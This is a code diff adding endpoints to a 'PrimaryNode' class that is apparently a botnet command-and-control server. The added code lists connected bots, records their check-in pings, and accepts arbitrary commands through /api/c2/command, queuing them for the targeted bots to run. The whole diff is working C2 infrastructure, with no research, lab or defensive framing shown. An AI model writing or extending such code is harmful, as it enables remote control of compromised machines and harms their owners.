@@ -1004,6 +1004,33 @@ class PrimaryNode:
             headers = http_request["headers"]
             body = http_request["body"]
 
+            if method == "GET" and path == "/api/bots":
+                bots_snapshot = self._build_bot_snapshot()
+                return self._http_response(
+                    200,
+                    "OK",
+                    json.dumps(bots_snapshot).encode("utf-8"),
+                    content_type="application/json",
+                )
+
+            if method == "GET" and path.startswith("/api/bots/") and path.endswith("/ping"):
+                parts = path.strip("/").split("/")
+                if len(parts) == 4:
+                    bot_id = parts[2]
+                    payload = self._note_bot_ping(bot_id)
+                    return self._http_response(
+                        200,
+                        "OK",
+                        json.dumps(payload).encode("utf-8"),
+                        content_type="application/json",
+                    )
+                return self._http_response(
+                    400,
+                    "Bad Request",
+                    b'{"error":"invalid bot ping path"}',
+                    content_type="application/json",
+                )
+
             if method == "GET" and path == "/health":
                 health = {
                     "status": "ok",
@@ -1063,6 +1090,45 @@ class PrimaryNode:
                         200,
                         "OK",
                         response,
+                        content_type="application/json",
+                    )
+                if path == "/api/c2/command":
+                    try:
+                        command_request = json.loads(body.decode("utf-8"))
+                    except (json.JSONDecodeError, UnicodeDecodeError):
+                        return self._http_response(
+                            400,
+                            "Bad Request",
+                            b'{"error":"invalid json"}',
+                            content_type="application/json",
+                        )
+
+                    targets = command_request.get("targets", [])
+                    command = command_request.get("command")
+                    if not targets or not command:
+                        return self._http_response(
+                            400,
+                            "Bad Request",
+                            b'{"error":"missing targets or command"}',
+                            content_type="application/json",
+                        )
+
+                    command_obj = {
+                        "type": "command",
+                        "command": command,
+                        "command_id": random.randint(1000, 9999),
+                        "issued_at": time.time(),
+                    }
+
+                    for bot_id in targets:
+                        queue = self.pending_commands.setdefault(bot_id, [])
+                        queue.append(command_obj)
+
+                    print(f"[+] PrimaryNode: Issued command '{command}' to targets: {targets}")
+                    return self._http_response(
+                        200,
+                        "OK",
+                        b'{"status":"ok"}',
                         content_type="application/json",
                     )
                 return self._http_response(
